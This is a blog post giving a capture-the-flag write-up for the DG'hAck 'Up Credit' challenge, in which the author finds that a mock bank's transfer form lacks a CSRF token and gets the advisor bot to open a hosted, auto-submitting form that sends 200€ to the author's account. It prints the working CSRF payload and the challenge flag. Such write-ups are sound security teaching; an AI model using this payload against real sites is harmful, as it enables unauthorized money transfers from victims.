<!doctype html><html lang=en-us><head><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link rel=stylesheet href=/css/main.min.3c9fa6b3264a9f8be4f27730f1d5f0ded496304d03812ed49d97703ffb28122a.css integrity="sha256-PJ+msyZKn4vk8ncw8dXw3tSWME0DgS7UnZdwP/soEio=" crossorigin=anonymous media=screen><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Didact+Gothic"><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=HandheldFriendly content="True"><meta name=MobileOptimized content="320"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><title>Writeup DG&rsquo;hAck: Up Credit - Nicolas Bourras</title><meta name=twitter:card content="summary"><meta name=twitter:title content="Writeup DG'hAck: Up Credit"><meta name=twitter:description content="The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200€!
Let&rsquo;s start by registering for an account. After entering our name and email, we get an account ID and a password:

After logging in, we are presented with an interface that has three tabs:
 an activity log a money transfer form a form to contact our financial advisor  Trying an XSS in the contact form quickly reveals that the bot doesn&rsquo;t execute any javascript, but does click any link that is posted."><meta property="og:title" content="Writeup DG'hAck: Up Credit"><meta property="og:description" content="The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200€!
Let&rsquo;s start by registering for an account. After entering our name and email, we get an account ID and a password:

After logging in, we are presented with an interface that has three tabs:
 an activity log a money transfer form a form to contact our financial advisor  Trying an XSS in the contact form quickly reveals that the bot doesn&rsquo;t execute any javascript, but does click any link that is posted."><meta property="og:type" content="article"><meta property="og:url" content="https://nicolasb.fr/blog/writeup-dghack-up-credit/"><meta property="article:published_time" content="2020-11-19T04:29:21+01:00"><meta property="article:modified_time" content="2020-11-19T04:29:21+01:00"><title>Writeup DG&rsquo;hAck: Up Credit</title></head><body><header class="wrap flex-container"><h1>Writeup DG&rsquo;hAck: Up Credit</h1></header><main class=wrap><div class=flex-container><aside role=complementary>Nov 19, 2020 &#183; 279 words<div class=tag-container><span class=tag><a href=/tags/blog/>blog</a></span>
<span class=tag><a href=/tags/security/>security</a></span>
<span class=tag><a href=/tags/ctf/>ctf</a></span>
<span class=tag><a href=/tags/dghack/>dghack</a></span></div></aside><hr><article role=article><p>The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200€!</p><p>Let&rsquo;s start by registering for an account. After entering our name and email, we get an account ID and a password:</p><p><a href=/assets/dghack/upcredit-registration.png><img src=/assets/dghack/upcredit-registration.png alt="The registration message"></a></p><p>After logging in, we are presented with an interface that has three tabs:</p><ul><li>an activity log</li><li>a money transfer form</li><li>a form to contact our financial advisor</li></ul><p>Trying an XSS in the contact form quickly reveals that the bot doesn&rsquo;t execute any javascript, but does click any link that is posted. This will probably be useful later on.</p><p>Let&rsquo;s look at the money transfer form:</p><p><a href=/assets/dghack/upcredit-money-transfer.png><img src=/assets/dghack/upcredit-money-transfer.png alt="The money transfer form"></a></p><p>It looks quite simple. After registering another account and trying:</p><ul><li>sending money we don&rsquo;t have</li><li>sending huge amounts of money</li><li>sending negative amounts of money</li><li>some sqli</li></ul><p>We find out that the form is quite secure. But wait, it doesn&rsquo;t have any CSRF token! Let&rsquo;s try exploiting that. Using <a href=ngrok.com>ngrok</a>, we create a webpage and temporarily host it.</p><p>In it, we copy the form which we fill out, and add a little bit of JS to automatically submit it:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://upcredit4.chall.malicecyber.com/transfer&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form&#34;</span>&gt;
    &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;col-md-12 col-sm-12 col-xs-12&#34;</span>&gt;
        &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-group&#34;</span>&gt;
        &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-control&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;account&#34;</span>
                   <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Account number&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;account&#34;</span>
                   <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Aln6qOfUJ&#34;</span>&gt;
        &lt;/<span style=color:#f92672>div</span>&gt;
        &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-group&#34;</span>&gt;
            &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;number&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;form-control&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;amount&#34;</span>
                   <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Amount&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;amount&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;200&#34;</span>&gt;
            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;help-block with-errors&#34;</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;color: #f00&#34;</span>&gt;&lt;/<span style=color:#f92672>div</span>&gt;
        &lt;/<span style=color:#f92672>div</span>&gt;
        &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pull-right&#34;</span>&gt;
            &lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;reg-submit&#34;</span>
                    <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;btn btn-md btn-common btn-log&#34;</span>&gt;Send
            &lt;/<span style=color:#f92672>button</span>&gt;
            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;msgSubmit&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;h3 text-center hidden&#34;</span>&gt;&lt;/<span style=color:#f92672>div</span>&gt;
            &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;clearfix&#34;</span>&gt;&lt;/<span style=color:#f92672>div</span>&gt;
        &lt;/<span style=color:#f92672>div</span>&gt;
    &lt;/<span style=color:#f92672>div</span>&gt;
&lt;/<span style=color:#f92672>form</span>&gt;

&lt;<span style=color:#f92672>script</span>&gt;
    <span style=color:#a6e22e>form</span>.<span style=color:#a6e22e>submit</span>()
&lt;/<span style=color:#f92672>script</span>&gt;
</code></pre></div><p>After posting the link to our form in the contact area and waiting for a few seconds, we get a money transfer:</p><p><a href=/assets/dghack/upcredit-credited.png><img src=/assets/dghack/upcredit-credited.png alt="The money transfer form"></a></p><p>And we can buy the flag: <code>W1nG4rD1um\L3v1os444!</code>.</p><hr><p><a href=/tags/dghack>View all of the DG&rsquo;hAck articles</a>.</p></article></div><nav role=navigation class="flex-container bottom-menu"><hr><p><a href=/blog>back</a>
&#183;
<a href=/blog>blog</a>
&#183;
<a href=/recipes>recipes</a>
&#183;
<a href=/about>who am I?</a>
&#183;
<a href=/>home</a></p></nav></main><footer class="flex-container footer">Nicolas Bourras&rsquo;s site</footer></body></html>